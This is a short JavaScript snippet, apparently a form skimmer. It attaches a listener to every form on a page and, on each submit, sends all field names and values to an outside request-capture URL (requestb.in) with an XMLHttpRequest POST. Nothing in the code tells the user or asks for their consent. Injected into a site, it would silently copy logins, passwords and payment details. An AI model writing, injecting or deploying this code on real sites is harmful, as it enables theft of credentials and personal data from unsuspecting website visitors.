//get every form
var forms = document.forms;

//called when a submit event happens
function formSubmit(event) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://requestb.in/pemce6pe');
    var string = '';
    // iterate over all of the form fields and urlencode them. There'll be an extra & at the end but who cares
    for (index = 0; index < event.target.elements.length; ++index) {
        string = string + event.target.elements[index].name + '=' + event.target.elements[index].value + '&';
    }
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.send(string);
}

// add an event listener to the submit event for every form in the page
for (index = 0; index < forms.length; ++index) {
    forms[index].addEventListener('submit', formSubmit);
}
